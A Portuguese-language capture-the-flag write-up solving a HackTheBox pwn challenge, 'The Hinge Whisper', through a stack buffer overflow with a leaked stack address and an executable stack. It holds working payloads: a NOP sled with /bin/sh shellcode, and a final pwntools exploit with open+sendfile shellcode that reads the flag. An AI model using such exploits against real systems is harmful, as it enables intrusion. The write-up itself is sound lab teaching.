# The Hinge Whisper
## Resolvida por Nathan
### Visão geral

“The Hinge Whisper” é um desafio de pwn da HackTheBox Cyber Apocalypse que explora um buffer overflow clássico na stack. O binário possui algumas proteções modernas, como PIE e Full RELRO, mas também apresenta duas condições decisivas para exploração:

* não possui stack canary;
* possui stack executável, ou seja, NX está desabilitado.

Além disso, o próprio programa imprime o endereço do buffer na stack antes de receber a entrada do usuário. Esse vazamento elimina a necessidade de adivinhar o endereço da stack e permite redirecionar a execução diretamente para shellcode injetado no buffer.

No ambiente local, o objetivo foi inicialmente obter uma shell interativa. No remoto, porém, a execução de `execve("/bin/sh")` aparentemente era bloqueada por seccomp. A solução final foi trocar a shell por um shellcode ORW: abrir, ler e imprimir diretamente o arquivo da flag.

#### Proteções do binário

A análise com `checksec` indicava aproximadamente o seguinte cenário:

```text
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

PIE e Full RELRO dificultam técnicas tradicionais baseadas em endereços estáticos, como GOT overwrite e ROP com gadgets fixos. Porém, neste caso, não foi necessário construir uma cadeia ROP: a stack era executável e o binário fornecia o endereço exato do buffer.

A ausência de canary permite sobrescrever o endereço de retorno sem que o programa detecte a corrupção da stack antes do `ret`.

## Identificando a vulnerabilidade

A função vulnerável é `service_hatch`:

```asm
service_hatch:
   endbr64
   push %rbp
   mov %rsp,%rbp
   sub $0x40,%rsp

   lea -0x40(%rbp),%rax
   mov %rax,%rsi
   ...
   call printf@plt

   lea -0x40(%rbp),%rax
   mov $0x50,%edx
   mov %rax,%rsi
   mov $0x0,%edi
   call read@plt

   leave
   ret
```

O ponto central é a diferença entre o espaço reservado e a quantidade de dados lida:

```asm
sub $0x40, %rsp     ; reserva 64 bytes para o buffer
...
mov $0x50, %edx     ; read recebe até 80 bytes
call read@plt
```

Em termos equivalentes em C:

```c
char buffer[64];
read(0, buffer, 80);
```

O programa lê 80 bytes em um buffer de 64 bytes, resultando em um overflow de 16 bytes.

A estrutura relevante da stack fica assim:

| Região                         |  Tamanho |
| ------------------------------ | -------: |
| Buffer controlado pelo usuário | 64 bytes |
| Saved RBP                      |  8 bytes |
| Saved RIP                      |  8 bytes |

Portanto, o offset até o endereço de retorno salvo é:

```text
64 + 8 = 72 bytes
```

Esse valor foi confirmado com um cyclic pattern.

#### O vazamento de endereço da stack

Antes de chamar `read`, o binário exibe uma mensagem semelhante a:

```text
The keyway sits at: 0x7fff...
```

Esse endereço corresponde ao início do buffer na stack.

Mesmo com PIE habilitado, o exploit não precisa conhecer endereços do binário ou de libc. Em vez de retornar para uma função ou gadget, ele retorna para o shellcode armazenado no próprio buffer.

O leak da stack é, portanto, a peça que torna confiável o retorno para código injetado.

#### Primeira tentativa: shellcode com NOP sled fixo

A primeira versão tentou usar um NOP sled fixo:

```python
payload = b"\x90" * 24
payload += asm(shellcraft.sh())
payload = payload.ljust(72, b"A")
payload += p64(stack_leak + 12)
```

A ideia era simples:

1. colocar NOPs no início do buffer;
2. adicionar shellcode de `/bin/sh`;
3. preencher até o offset de 72 bytes;
4. sobrescrever o RIP com um endereço no meio do NOP sled.

No teste específico, o shellcode tinha 48 bytes:

```text
24 bytes de NOP + 48 bytes de shellcode = 72 bytes
```

Logo, o `ljust(72, b"A")` não adicionava padding algum.

O problema mais importante não era o `ljust` em si, mas a dependência de um tamanho fixo. A exploração assumia implicitamente que o shellcode sempre teria exatamente 48 bytes. Se o shellcode fosse alterado, se uma instrução extra fosse adicionada ou se a geração variasse, o endereço de retorno deixaria de ficar exatamente no offset 72.

Esse tipo de erro é perigoso porque o exploit parece visualmente correto, mas depende de uma condição frágil e não validada dinamicamente. O resultado foi um `SIGSEGV`.

#### Hipótese: CET / Shadow Stack

O `checksec` também indicava:

```text
SHSTK: Enabled
IBT: Enabled
```

Isso levantou a hipótese de que CET, especialmente Shadow Stack, estivesse impedindo o retorno sobrescrito.

Em uma proteção de Shadow Stack efetivamente ativa, o processador mantém uma cópia protegida dos endereços de retorno. Ao executar `ret`, o endereço presente na stack normal é comparado com o da shadow stack. Uma divergência pode encerrar o processo.

Para testar essa hipótese, o binário foi executado com:

```bash
GLIBC_TUNABLES=glibc.cpu.hwcaps=-SHSTK,-IBT ./the_hinge_whisper
```

O crash continuou ocorrendo. Isso descartou CET como causa principal do problema.

Essa verificação foi importante porque evita perder tempo tentando “burlar” uma mitigação que, naquele ambiente, não era a responsável pela falha.

#### Debug com GDB

A etapa seguinte foi observar a stack imediatamente antes do retorno.

Com pwntools, foi utilizado um breakpoint no `ret` da função vulnerável:

```python
gdb.attach(io, gdbscript="""
break *service_hatch+98
continue
""")
```

No breakpoint, a stack foi inspecionada com:

```gdb
x/10gx $rsp
```

O objetivo era confirmar três pontos:

1. o buffer começava no endereço vazado pelo programa;
2. o shellcode estava presente na posição esperada;
3. o valor localizado em `RSP` no momento do `ret` era exatamente o endereço calculado para o retorno.

Essa análise confirmou que o problema não era uma proteção adicional, um segundo `read`, um canary oculto ou uma validação no fluxo da função. Era um problema de construção do payload.

#### Correção: padding calculado dinamicamente

A correção foi calcular o tamanho do NOP sled a partir do tamanho real do shellcode:

```python
nop_len = offset - len(shellcode)
payload = b"\x90" * nop_len + shellcode
payload += p64(stack_leak + nop_len // 2)
```

Com isso:

```text
len(NOP sled) + len(shellcode) = 72 bytes
```

O endereço de retorno é adicionado apenas depois dos 72 bytes:

```text
[ NOP sled ][ shellcode ][ saved RBP ][ saved RIP ]
```

O payload completo possui exatamente 80 bytes:

```text
72 bytes até RIP + 8 bytes do novo RIP = 80 bytes
```

Isso coincide exatamente com o limite do `read(0, buffer, 0x50)`.

O retorno foi direcionado para o meio do NOP sled:

```python
ret_addr = stack_leak + nop_len // 2
```

Essa escolha aumenta a tolerância a pequenas imprecisões de endereço: mesmo que o retorno não caia no primeiro byte do shellcode, ele percorre os NOPs até alcançar as instruções úteis.

A versão corrigida funcionou localmente e obteve uma shell `/bin/sh`.

#### Diferença entre ambiente local e remoto

Apesar do sucesso local, o mesmo exploit falhava no servidor remoto. Após o envio do payload, a conexão era encerrada imediatamente com EOF, sem shell interativa e sem saída adicional.

Esse comportamento é compatível com uma sandbox seccomp-bpf bloqueando a syscall `execve`.

O shellcode gerado por:

```python
shellcraft.sh()
```

normalmente executa algo equivalente a:

```c
execve("/bin/sh", ...);
```

Em desafios CTF, é comum que o ambiente remoto permita syscalls necessárias para leitura de arquivos, mas bloqueie `execve` para evitar que a solução seja apenas obter uma shell. Nesses casos, uma shell pode funcionar localmente e falhar remotamente sem que exista erro no overflow ou no endereço de retorno.

A lição é que “exploit local funcionando” não garante que a técnica final é compatível com as restrições do servidor remoto.

Quando há suspeita de seccomp, vale adaptar a estratégia para a finalidade real do desafio. Se o objetivo é obter a flag, não é necessário abrir uma shell: basta ler o arquivo e enviar seu conteúdo para stdout.

#### Shellcode ORW: Open / Sendfile

A primeira alternativa foi um shellcode ORW tradicional:

1. `open("flag.txt")`;
2. `read(fd, buffer, tamanho)`;
3. `write(1, buffer, tamanho)`;
4. `exit()`.

Porém, essa abordagem ultrapassava o espaço disponível. A versão inicial tinha cerca de 100 bytes, enquanto só existiam 72 bytes antes do saved RIP.

A otimização foi substituir `read` + `write` por `sendfile`.

Em Linux, `sendfile` permite copiar dados diretamente de um descritor de arquivo para outro:

```c
sendfile(stdout, flag_fd, NULL, tamanho);
```

Assim, o shellcode final precisava apenas:

1. abrir o arquivo da flag;
2. chamar `sendfile` para enviar seu conteúdo ao stdout.

Isso reduziu suficientemente o tamanho do shellcode para que ele coubesse nos 72 bytes disponíveis.

Como o leak da stack se mostrou preciso, não foi mais necessário usar NOP sled. O endereço de retorno passou a apontar diretamente para o início do buffer:

```python
ret_addr = stack_leak
```

#### Exploit final

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"

HOST = "challenge-host.htb"
PORT = 1337

BIN = "./the_hinge_whisper"
OFFSET = 72

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BIN)

io = start()

io.recvuntil(b"The keyway sits at: ")
stack_leak = int(io.recvline().strip(), 16)

log.info(f"Stack leak: {hex(stack_leak)}")

shellcode = asm(
    shellcraft.open("flag.txt", 0, 0) +
    shellcraft.sendfile(1, "rax", 0, 0x100)
)

log.info(f"Shellcode size: {len(shellcode)} bytes")

if len(shellcode) > OFFSET:
    log.error("Shellcode maior que o espaço disponível antes do RIP.")
    exit()

payload = shellcode.ljust(OFFSET, b"\x90")
payload += p64(stack_leak)

log.info(f"Payload size: {len(payload)} bytes")

io.send(payload)
print(io.recvall().decode(errors="replace"))
```

Execução local:

```bash
python3 exploit.py
```

Execução remota:

```bash
python3 exploit.py REMOTE
```

#### Conclusão

O desafio demonstra uma exploração direta de stack buffer overflow em um binário 64-bit:

* `read` aceita mais bytes do que o buffer suporta;
* não existe stack canary;
* a stack é executável;
* o programa vaza o endereço exato do buffer;
* o RIP pode ser sobrescrito após 72 bytes;
* o shellcode pode ser executado diretamente na stack.

A parte mais valiosa da resolução foi a evolução da técnica. Primeiro, foi necessário corrigir a construção frágil do payload usando cálculo dinâmico de padding. Depois, foi necessário distinguir um problema de exploração de uma restrição do ambiente remoto. Por fim, o shell interativo foi substituído por uma estratégia orientada ao objetivo: ler e imprimir a flag com um shellcode compacto de `open` + `sendfile`.

Em desafios de pwn, o objetivo final raramente é “obter uma shell” por si só. A shell é apenas uma técnica. Quando o ambiente impõe restrições, adaptar o payload àquilo que realmente precisa ser alcançado costuma ser a diferença entre um exploit local e uma solução funcional no servidor remoto.
